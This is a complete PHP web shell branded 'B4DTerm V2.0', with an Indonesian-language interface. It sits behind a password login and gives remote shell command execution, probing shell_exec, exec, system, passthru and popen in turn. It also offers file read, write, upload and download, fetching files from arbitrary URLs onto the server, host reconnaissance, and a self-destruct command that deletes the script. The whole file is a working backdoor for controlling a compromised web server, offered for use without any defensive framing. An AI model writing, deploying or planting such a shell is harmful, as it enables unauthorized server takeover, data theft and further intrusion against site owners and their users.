<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// Konfigurasi Hash (Strict)
$h = '$2y$10$hV98QcCsi2h0xSFSzOOSJuccQTZWjSzydYET4dxZIY0sKHsiFtQyG';

if (isset($_GET['bye'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Auth Logic
if (!isset($_SESSION['l']) || !$_SESSION['l']) {
    if (isset($_POST['p'])) {
        if (password_verify($_POST['p'], $h)) {
            $_SESSION['l'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    // Custom Polished Login Page (Sesuai request)
    die("<!DOCTYPE html><html class='dark'><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>B4DTerm Login</title><script src='https://cdn.tailwindcss.com'></script><style>.bg-terminal{background-color:#000}.border-terminal{border-color:#27272a}.text-accent{color:#10b981}.font-mono{font-family:monospace}</style></head><body class='bg-neutral-950 h-screen flex justify-center items-center font-mono text-xs'><div class='terminal-window bg-terminal border border-terminal rounded-xl shadow-2xl p-6 w-full max-w-sm'><div class='flex items-center gap-2 mb-4 border-b pb-2 border-neutral-800'><div class='w-2 h-2 rounded-full bg-red-500'></div><div class='w-2 h-2 rounded-full bg-yellow-500'></div><div class='w-2 h-2 rounded-full bg-emerald-500'></div><span class='font-bold text-gray-200 ml-2'>B4DTerm</span><span class='text-gray-600 ml-auto'>Â© Pawline</span></div><div class='text-center mb-6'><h1 class='text-lg font-bold text-accent'>SECURE ACCESS</h1><p class='text-gray-500'>Authentication Required</p></div><form method='post' class='space-y-4'><div class='relative'><span class='absolute left-3 top-1/2 -translate-y-1/2 text-accent font-bold'>$</span><input type='password' name='p' class='w-full bg-neutral-900 border border-neutral-800 text-white pl-7 pr-4 py-2 rounded focus:outline-none focus:border-accent placeholder-neutral-600 text-sm tracking-wide' placeholder='' autofocus></div><button type='submit' class='w-full bg-accent/20 border border-accent/30 text-accent py-2 rounded text-sm font-semibold hover:bg-accent/30 transition-colors'>Gaskeun</button></form><div class='mt-6 text-center text-neutral-600 text-[10px]'>ACCESS AT YOUR OWN RISK</div></div></body></html>");
}

if (!isset($_SESSION['d'])) $_SESSION['d'] = getcwd();

if (isset($_GET['get'])) {
    $f = $_SESSION['d'] . '/' . $_GET['get'];
    if (file_exists($f)) {
        $filename = $_GET['saveas'] ?? basename($f);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$filename.'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }
}

// Fungsi untuk membaca file
if (isset($_POST['readfile'])) {
    $file = $_SESSION['d'] . '/' . $_POST['readfile'];
    if (file_exists($file) && is_file($file)) {
        $content = file_get_contents($file);
        echo json_encode(['success' => true, 'content' => $content]);
    } else {
        echo json_encode(['success' => false, 'error' => 'File not found']);
    }
    exit;
}

// Fungsi untuk menulis file
if (isset($_POST['writefile'])) {
    $file = $_SESSION['d'] . '/' . $_POST['writefile'];
    $content = $_POST['content'];
    if (file_put_contents($file, $content) !== false) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Write failed']);
    }
    exit;
}

// Fungsi untuk upload dari URL
if (isset($_POST['url_upload'])) {
    $url = $_POST['url'];
    $filename = $_POST['url_filename'] ?? basename($url);
    
    // Validasi URL
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        echo json_encode(['success' => false, 'error' => 'Invalid URL']);
        exit;
    }
    
    $filepath = $_SESSION['d'] . '/' . $filename;
    
    // Download file dari URL
    $content = @file_get_contents($url);
    if ($content !== false && file_put_contents($filepath, $content) !== false) {
        echo json_encode(['success' => true, 'path' => $filepath, 'size' => strlen($content)]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Download failed']);
    }
    exit;
}

// Fungsi untuk get IP info
if (isset($_POST['get_ip_info'])) {
    $client_ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $server_ip = $_SERVER['SERVER_ADDR'];
    $hostname = gethostname();
    
    echo json_encode([
        'success' => true,
        'client_ip' => $client_ip,
        'server_ip' => $server_ip,
        'hostname' => $hostname
    ]);
    exit;
}

// Fungsi Probing Method
function _probe_method() {
    $fx = ['shell_exec', 'exec', 'passthru', 'system', 'popen'];
    foreach ($fx as $m) {
        if (function_exists($m)) return $m;
    }
    return 'none';
}

if (isset($_POST['k'])) {
    header('Content-Type: application/json');
    $c = trim($_POST['k']);
    $r = ['o' => '', 'd' => $_SESSION['d'], 'm' => 'none'];

    if ($c === 'self_destruct') {
        if (unlink(__FILE__)) {
            $r['o'] = "System destroyed.";
            session_destroy();
        } else {
            $r['o'] = "Destruct failed.";
        }
        echo json_encode($r);
        exit;
    }

    if (strpos($c, 'cd ') === 0) {
        $n = substr($c, 3);
        chdir($_SESSION['d']);
        if (@chdir($n)) {
            $_SESSION['d'] = getcwd();
            $r['d'] = $_SESSION['d'];
        } else {
            $r['o'] = "Path tidak ditemukan."; 
            $r['e'] = true;
        }
        echo json_encode($r);
        exit;
    }

    chdir($_SESSION['d']);
    $o = '';
    $fx = ['shell_exec', 'exec', 'passthru', 'system', 'popen'];
    foreach ($fx as $m) {
        if (function_exists($m)) {
            $r['m'] = $m; 
            if ($m == 'exec') { @exec($c." 2>&1", $a); $o = implode("\n", $a); }
            elseif ($m == 'shell_exec') { $o = @shell_exec($c." 2>&1"); }
            elseif ($m == 'passthru' || $m == 'system') { ob_start(); @$m($c." 2>&1"); $o = ob_get_clean(); }
            elseif ($m == 'popen') { $h_p = @popen($c, 'r'); if($h_p){ while(!feof($h_p)) $o.=fread($h_p,1024); pclose($h_p); } }
            break;
        }
    }
    
    // Logic untuk Silent Success Feedback
    if (empty($o) && !isset($r['e']) && $c !== 'self_destruct' && !strpos($c, 'cd ') && !strpos($c, 'help')) {
        $r['s'] = true; 
    }

    $r['o'] = empty($o) ? "" : $o;
    echo json_encode($r);
    exit;
}

if (isset($_FILES['f'])) {
    $t = $_SESSION['d'] . '/' . basename($_FILES['f']['name']);
    $s = move_uploaded_file($_FILES['f']['tmp_name'], $t);
    echo json_encode(['s' => $s, 'path' => $t]);
    exit;
}

$probe = _probe_method();
?>
<!DOCTYPE html>
<html lang="id" class="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>B4DTerm by Pawline</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap');

::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:#333;border-radius:2px}
.g{background:rgba(10,10,10,0.9);backdrop-filter:blur(10px)}
.modal{background:rgba(0,0,0,0.8);backdrop-filter:blur(5px)}
.quick-scroll{display:flex;overflow-x:auto;gap:6px;padding:8px}
.quick-scroll::-webkit-scrollbar{height:3px}
.output-bg{
    background-image:url('https://mfiles.alphacoders.com/101/thumb-1920-1012645.png');
    background-size:cover;
    background-position:center;
    background-attachment:fixed;
    position:absolute;
    inset:0;
}
.output-content{
    background:rgba(0,0,0,0.75);
    backdrop-filter:blur(4px);position:absolute;
    inset:0;
}
body {
    font-family: 'JetBrains Mono', monospace;
}
</style>
</head>
<body class="bg-neutral-950 flex items-center justify-center h-[100dvh] p-2 sm:p-6 text-gray-400 overflow-hidden" style="font-family: 'JetBrains Mono', monospace;">

<!-- Modal Edit File -->
<div id="editModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-emerald-500/30 rounded-xl w-full max-w-4xl h-[80vh] flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-emerald-500/30 bg-emerald-900/10">
            <h3 class="text-emerald-400 font-bold text-sm"><i class="fas fa-edit mr-2"></i>Edit File</h3>
            <button onclick="closeEditModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="flex-1 p-4">
            <input type="text" id="editFileName" class="w-full bg-neutral-900 border border-emerald-500/30 rounded px-3 py-2 mb-3 text-white placeholder-gray-500 text-sm" placeholder="Nama file...">
            <textarea id="editFileContent" class="w-full h-full bg-neutral-900 border border-emerald-500/30 rounded px-3 py-2 text-white text-sm resize-none placeholder-gray-500" placeholder="Konten file..."></textarea>
        </div>
        <div class="flex gap-2 p-4 border-t border-emerald-500/30 bg-emerald-900/10">
            <button onclick="saveFile()" class="bg-emerald-600 text-white px-4 py-2 rounded hover:bg-emerald-500 flex-1 text-sm"><i class="fas fa-save mr-2"></i>Simpan</button>
            <button onclick="closeEditModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Batal</button>
        </div>
    </div>
</div>

<!-- Modal Upload dari URL -->
<div id="urlUploadModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-blue-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-blue-500/30 bg-blue-900/10">
            <h3 class="text-blue-400 font-bold text-sm"><i class="fas fa-cloud-download-alt mr-2"></i>Upload dari URL</h3>
            <button onclick="closeUrlUploadModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-link mr-1"></i>URL File:</label>
                <input type="text" id="urlInput" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="https://example.com/file.zip">
            </div>
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-save mr-1"></i>Simpan sebagai (opsional):</label>
                <input type="text" id="urlFilename" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_file.ext">
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-blue-500/30 bg-blue-900/10">
            <button onclick="startUrlUpload()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-500 flex-1 text-sm"><i class="fas fa-download mr-2"></i>Download</button>
            <button onclick="closeUrlUploadModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Batal</button>
        </div>
    </div>
</div>

<!-- Modal Download dengan Nama Custom -->
<div id="downloadModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-cyan-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-cyan-500/30 bg-cyan-900/10">
            <h3 class="text-cyan-400 font-bold text-sm"><i class="fas fa-file-download mr-2"></i>Download File</h3>
            <button onclick="closeDownloadModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-cyan-400 text-xs block mb-1"><i class="fas fa-file mr-1"></i>File yang akan didownload:</label>
                <input type="text" id="downloadFile" class="w-full bg-neutral-900 border border-cyan-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_file.ext">
            </div>
            <div>
                <label class="text-cyan-400 text-xs block mb-1"><i class="fas fa-edit mr-1"></i>Simpan sebagai:</label>
                <input type="text" id="downloadAs" class="w-full bg-neutral-900 border border-cyan-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="nama_custom.extensi_apa_saja">
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-cyan-500/30 bg-cyan-900/10">
            <button onclick="startCustomDownload()" class="bg-cyan-600 text-white px-4 py-2 rounded hover:bg-cyan-500 flex-1 text-sm"><i class="fas fa-download mr-2"></i>Download</button>
            <button onclick="closeDownloadModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Batal</button>
        </div>
    </div>
</div>

<!-- Modal IP Info -->
<div id="ipModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-purple-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-purple-500/30 bg-purple-900/10">
            <h3 class="text-purple-400 font-bold text-sm"><i class="fas fa-network-wired mr-2"></i>Informasi IP</h3>
            <button onclick="closeIpModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-desktop mr-1"></i>IP Address Anda:</div>
                <div id="clientIp" class="text-white font-bold text-sm">Memuat...</div>
            </div>
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-server mr-1"></i>IP Server:</div>
                <div id="serverIp" class="text-white font-bold text-sm">Memuat...</div>
            </div>
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-computer mr-1"></i>Hostname:</div>
                <div id="hostname" class="text-white font-bold text-sm">Memuat...</div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-purple-500/30 bg-purple-900/10">
            <button onclick="closeIpModal()" class="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Tutup</button>
        </div>
    </div>
</div>

<div class="terminal-window bg-black border border-neutral-800 rounded-xl shadow-2xl flex flex-col w-full max-w-7xl h-full sm:h-[90dvh]">

    <header class="h-10 border-b border-white/10 flex items-center justify-between px-3 bg-neutral-900/50 shrink-0 rounded-t-xl">
        <div class="flex items-center gap-2">
            <div class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
            <span class="font-bold text-gray-200 text-sm">B4DTerm V2.0</span> <span class="text-xs text-gray-600">Â© Pawline</span>
        </div>
        <div class="flex gap-3">
            <span class="text-gray-600 hidden sm:block text-xs"><?= php_uname('s') ?></span>
            <a href="?bye" class="text-red-500 hover:text-red-400font-bold text-xs"><i class="fas fa-sign-out-alt mr-1"></i>Keluar</a>
        </div>
    </header>

    <main id="tm" class="flex-1 overflow-hidden relative flex flex-col">
        <div class="output-bg"></div>
        <div class="output-content"></div>
        <div id="out" class="flex-1 overflow-y-auto overflow-x-hidden p-4 space-y-1 relative z-10">
            <div class="text-gray-600 mb-4 text-xs">PID: <?= getmypid() ?></div>
            <div id="status" class="text-emerald-500 font-semibold text-xs mb-2"></div>
        </div>
    </main>

    <footer class="bg-black border-t border-white/10 z-20 shrink-0 rounded-b-xl">
        <div id="up" class="hidden bg-neutral-900 p-2 border-b border-white/5 flex gap-2">
            <input type="file" id="fi" class="w-full text-xs text-gray-400 file:bg-emerald-900 file:text-emerald-400 file:border-0 file:px-2 file:py-1 file:rounded cursor-pointer">
            <button id="ub" class="bg-emerald-600 text-white px-3 py-1 rounded hover:bg-emerald-500 text-xs"><i class="fas fa-upload mr-1"></i>Upload</button>
            <button onclick="openUrlUploadModal()" class="bg-blue-600 text-white px-3 py-1 rounded hover:bg-blue-500 text-xs"><i class="fas fa-cloud-download-alt mr-1"></i>Dari URL</button>
        </div>

        <div class="quick-scroll bg-neutral-900/50">
            <!-- File Operations -->
            <button onclick="x('ls -la --color=never')" class="px-3 py-2 bg-green-900/30 hover:bg-green-900/50 border border-green-500/30 rounded text-green-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-list w-3"></i><span>List</span></button>
            <button onclick="createFolder()" class="px-3 py-2 bg-blue-900/30 hover:bg-blue-900/50 border border-blue-500/30 rounded text-blue-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-folder-plus w-3"></i><span>Folder</span></button>
            <button onclick="createFile()" class="px-3 py-2 bg-blue-900/30 hover:bg-blue-900/50 border border-blue-500/30 rounded text-blue-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fa-regular fa-file w-3"></i><span>File</span></button>
            <button onclick="renameFile()" class="px-3 py-2 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30 rounded text-purple-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-edit w-3"></i><span>Rename</span></button>
            <button onclick="editFile()" class="px-3 py-2 bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-500/30 rounded text-yellow-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-edit w-3"></i><span>Edit</span></button>
            <button onclick="openDownloadModal()" class="px-3 py-2 bg-cyan-900/30 hover:bg-cyan-900/50 border border-cyan-500/30 rounded text-cyan-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-download w-3"></i><span>Download</span></button>
            <button onclick="tg()" class="px-3 py-2 bg-emerald-900/30 hover:bg-emerald-900/50 border border-emerald-500/30 rounded text-emerald-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-upload w-3"></i><span>Upload</span></button>
            
            <!-- System & Info -->
            <button onclick="x('id; uname -a; pwd')" class="px-3 py-2 bg-orange-900/30 hover:bg-orange-900/50 border border-orange-500/30 rounded text-orange-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-info-circle w-3"></i><span>Info</span></button>
            <button onclick="showIpInfo()" class="px-3 py-2 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30 rounded text-purple-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-network-wired w-3"></i><span>IP Info</span></button>
            <button onclick="x('help')" class="px-3 py-2 bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-500/30 rounded text-yellow-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-question-circle w-3"></i><span>Help</span></button>
            <button onclick="if(confirm('Hancurkan sistem?'))x('self_destruct')" class="px-3 py-2 bg-red-900/30 hover:bg-red-900/50 border border-red-500/30 rounded text-red-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-skull w-3"></i><span>Hancurkan</span></button>
        </div>

        <div class="p-3 g rounded-b-xl">
            <div class="flex justify-between text-[10px] text-gray-500 mb-2 px-1">
                <div class="max-w-[80%] overflow-x-auto whitespace-nowrap pr-2">
                    <span id="wd" class="text-emerald-600 font-bold text-xs"><?= $_SESSION['d'] ?></span>
                </div>
                <span class="bg-neutral-800 px-2 py-1 rounded text-xs">PHP <?= phpversion() ?></span>
            </div>
            <div class="relative">
                <span class="absolute left-3 top-2 text-emerald-500 font-bold">$</span>
                <input id="ci" class="w-full bg-neutral-900 border border-emerald-500/30 rounded pl-6 pr-10 py-2 focus:outline-none focus:border-emerald-500 text-gray-200 placeholder-gray-500 text-sm transition-colors" autocomplete="off" spellcheck="false" placeholder="command...">
                <button id="sb" class="absolute right-2 top-2 text-emerald-500 hover:text-emerald-300 transition font-bold"><i class="fas fa-play"></i></button>
            </div>
        </div>
    </footer>
</div>

<script>
const O=document.getElementById('out'), I=document.getElementById('ci'), W=document.getElementById('wd'), S=document.getElementById('status');
const tg=()=>document.getElementById('up').classList.toggle('hidden');
const probeMethod = '<?= $probe ?>';
let isFirstCmd = true;

let history = [];
let histIdx = -1;

const helpText = `
B4DTerm V2.0 (Â© Pawline):

AKSI CEPAT:
ðŸ“ List      - Lihat file dan direktori
ðŸ“‚ Folder    - Buat folder baru
ðŸ“„ File      - Buat file baru  
âœï¸ Ganti Nama - Ubah nama file/folder
ðŸ“ Edit      - Edit konten file
ðŸ“¥ Download  - Download file
ðŸ“¤ Upload    - Upload file atau dari URL
ðŸ–¥ï¸ Info      - Informasi sistem
ðŸŒ IP Info   - Tampilkan IP & server
â“ Bantuan   - Tampilkan panduan ini
ðŸ’€ Hancurkan - Self Destruct!
`;

// ===== FILE OPERATIONS =====
const createFolder = () => {
    const folderName = prompt('Masukkan nama folder:', 'folder_baru');
    if (folderName && folderName.trim() !== '') {
        x('mkdir ' + folderName.trim());
    }
};

const createFile = () => {
    const fileName = prompt('Masukkan nama file:', 'file_baru.txt');
    if (fileName && fileName.trim() !== '') {
        x('touch ' + fileName.trim());
    }
};

const renameFile = () => {
    const oldName = prompt('Masukkan nama file/folder saat ini:');
    if (!oldName || oldName.trim() === '') return;
    
    const newName = prompt('Masukkan nama baru:', oldName);
    if (newName && newName.trim() !== '' && newName !== oldName) {
        x('mv "' + oldName.trim() + '" "' + newName.trim() + '"');
    }
};

const editFile = async () => {
    const fileName = prompt('Masukkan nama file yang akan diedit:');
    if (!fileName || fileName.trim() === '') return;

    try {
        const formData = new FormData();
        formData.append('readfile', fileName.trim());
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            document.getElementById('editFileName').value = fileName.trim();
            document.getElementById('editFileContent').value = result.content;
            document.getElementById('editModal').classList.remove('hidden');
        } else {
            lg('File tidak ditemukan atau tidak dapat dibaca', 0, 1);
        }
    } catch (error) {
        lg('Error membaca file', 0, 1);
    }
};

// ===== UPLOAD FROM URL =====
const openUrlUploadModal = () => {
    document.getElementById('urlUploadModal').classList.remove('hidden');
    document.getElementById('urlInput').focus();
};

const closeUrlUploadModal = () => {
    document.getElementById('urlUploadModal').classList.add('hidden');
    document.getElementById('urlInput').value = '';
    document.getElementById('urlFilename').value = '';
};

const startUrlUpload = async () => {
    const url = document.getElementById('urlInput').value.trim();
    const filename = document.getElementById('urlFilename').value.trim();
    
    if (!url) {
        alert('URL diperlukan!');
        return;
    }

    try {
        const formData = new FormData();
        formData.append('url_upload', '1');
        formData.append('url', url);
        if (filename) {
            formData.append('url_filename', filename);
        }
        
        lg(`Mendownload dari URL: ${url}`, 1);
        closeUrlUploadModal();
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            lg(`Download berhasil: ${result.path} (${result.size} bytes)`, 0, 0);
        } else {
            lg(`Download gagal: ${result.error}`, 0, 1);
        }
    } catch (error) {
        lg('Error downloading dari URL', 0, 1);
    }
};

// ===== CUSTOM DOWNLOAD =====
const openDownloadModal = () => {
    document.getElementById('downloadModal').classList.remove('hidden');
    document.getElementById('downloadFile').focus();
};

const closeDownloadModal = () => {
    document.getElementById('downloadModal').classList.add('hidden');
    document.getElementById('downloadFile').value = '';
    document.getElementById('downloadAs').value = '';
};

const startCustomDownload = () => {
    const file = document.getElementById('downloadFile').value.trim();
    const saveAs = document.getElementById('downloadAs').value.trim();
    
    if (!file) {
        alert('Nama file diperlukan!');
        return;
    }
    
    const filename = saveAs || file;
    closeDownloadModal();
    window.location = `?get=${encodeURIComponent(file)}&saveas=${encodeURIComponent(filename)}`;
};

// ===== IP INFO =====
const showIpInfo = async () => {
    document.getElementById('ipModal').classList.remove('hidden');
    
    try {
        const formData = new FormData();
        formData.append('get_ip_info', '1');
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            document.getElementById('clientIp').textContent = result.client_ip;
            document.getElementById('serverIp').textContent = result.server_ip;
            document.getElementById('hostname').textContent = result.hostname;
        } else {
            document.getElementById('clientIp').textContent = 'Error memuat info IP';
            document.getElementById('serverIp').textContent = 'Error memuat info IP';
            document.getElementById('hostname').textContent = 'Error memuat hostname';
        }
    } catch (error) {
        document.getElementById('clientIp').textContent = 'Error jaringan';
        document.getElementById('serverIp').textContent = 'Error jaringan';
        document.getElementById('hostname').textContent = 'Error jaringan';
    }
};

const closeIpModal = () => {
    document.getElementById('ipModal').classList.add('hidden');
};

// ===== MODAL FUNCTIONS =====
const closeEditModal = () => {
    document.getElementById('editModal').classList.add('hidden');
    document.getElementById('editFileName').value = '';
    document.getElementById('editFileContent').value = '';
};

const saveFile = async () => {
    const fileName = document.getElementById('editFileName').value.trim();
    const content = document.getElementById('editFileContent').value;
    
    if (!fileName) {
        alert('Nama file diperlukan!');
        return;
    }

    try {
        const formData = new FormData();
        formData.append('writefile', fileName);
        formData.append('content', content);
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            lg(`File "${fileName}" berhasil disimpan`, 0, 0);
            closeEditModal();
        } else {
            lg('Gagal menyimpan file: ' + (result.error || 'Error tidak diketahui'), 0, 1);
        }
    } catch (error) {
        lg('Error menyimpan file', 0, 1);
    }
};

// ===== CORE FUNCTIONS =====
const typeWriter = (text, element, callback, speed = 25) => {
    let i = 0;
    element.innerHTML = '';
    function type() {
        if (i < text.length) {
            element.innerHTML += text.charAt(i);
            i++;
            setTimeout(type, speed);
        } else if (callback) {
            callback();
        }
    }
    type();
};

const animateLoad = () => {
    typeWriter("Menghubungkan ke sistem...", S, () => {
        S.innerHTML = 'Menghubungkan ke sistem... [ <span class="text-white">OK</span> ]';
        const d2 = document.createElement('div');
        d2.className = 'text-emerald-500 font-semibold text-xs mb-4 mt-2';
        O.appendChild(d2);
        typeWriter(`B4DTerm V2.0`, d2, () => {
            I.focus();
        }, 30);
    }, 40);
};

const lg = (t, m, e=0, type='norm') => {
    const d=document.createElement('div');
    if(m){
        d.innerHTML=`<div class="text-[10px] text-gray-600 mt-2">root@local</div><div class="flex gap-2"><span class="text-emerald-500">$</span><span class="text-white">${t}</span></div>`;
    } else {
        d.className = `pl-3 border-l-2 ${e?'border-red-500 text-red-400':'border-white/20 text-gray-300'} whitespace-pre overflow-x-auto py-1 text-[11px] leading-snug`;
        d.innerText = t;
    }
    O.appendChild(d);
    O.scrollTop=O.scrollHeight;
}

const x = async(c) => {
    if(!c) c=I.value; if(!c) return;
    
    if (c !== 'clear' && c !== 'help' && !c.startsWith('dl ') && history[history.length - 1] !== c) {
        history.push(c);
    }
    histIdx = history.length;
    
    if(c=='clear'){ O.innerHTML=''; lg('PID: <?= getmypid() ?>',0,0,'pid'); animateLoad(); I.value=''; return; }
    if (c === 'help') {
        lg(c, 1);
        lg(helpText, 0, 0); 
        I.value = ''; I.focus(); return;
    }
    if(c.startsWith('dl ')){ 
        const file = c.substring(3);
        const saveAs = prompt('Simpan sebagai (opsional):', file);
        if (saveAs !== null) {
            window.location = `?get=${encodeURIComponent(file)}&saveas=${encodeURIComponent(saveAs || file)}`;
        }
        I.value=''; return; 
    }
    
    lg(c,1); I.value=''; I.disabled=1;
    
    try {
        const f=new FormData(); f.append('k',c);
        const r=await fetch('',{method:'POST',body:f}).then(res=>res.json());
        
        if(r.o) lg(r.o,0,r.e);
        else if (r.s && !r.e) {
             lg("Sukses.", 0, 0);
        }

        if(r.d) W.innerText=r.d;

        if (isFirstCmd && r.m && r.m !== 'none') {
            const m_d = document.createElement('div');
            m_d.className = 'text-emerald-500 text-[10px] pl-3 mb-2 font-semibold';
            O.appendChild(m_d);
            typeWriter(`Metode Eksekusi: ${r.m} Diaktifkan`, m_d);
            isFirstCmd = false;
        }

    } catch(e){ lg('Request Gagal',0,1); }
    I.disabled=0; I.focus();
}

document.getElementById('sb').onclick=()=>x();

I.onkeydown=e=>{
    if(e.key=='Enter') x();
    else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (histIdx > 0) I.value = history[--histIdx];
    }
    else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (histIdx < history.length - 1) I.value = history[++histIdx];
        else { histIdx = history.length; I.value = ''; }
    }
};

document.getElementById('ub').onclick=async()=>{
    const f=document.getElementById('fi').files[0];
    if(!f) return;
    const d=new FormData(); d.append('f',f);
    
    const originalText = document.getElementById('ub').innerText;
    document.getElementById('ub').innerText = '...';
    document.getElementById('ub').disabled = true;

    try {
        const r=await fetch('',{method:'POST',body:d}).then(res=>res.json());
        if (r.s && r.path) {
            lg(`Upload Berhasil: ${f.name} => ${r.path}`, 0);
        } else {
            lg(`Upload Gagal. Cek permissions.`, 0, 1);
        }
    } catch(e) {
        lg('Error Jaringan Upload', 0, 1);
    } finally {
        document.getElementById('ub').innerText = originalText;
        document.getElementById('ub').disabled = false;
        tg();
    }
};

window.onload = () => animateLoad();
</script>
</body>
</html>
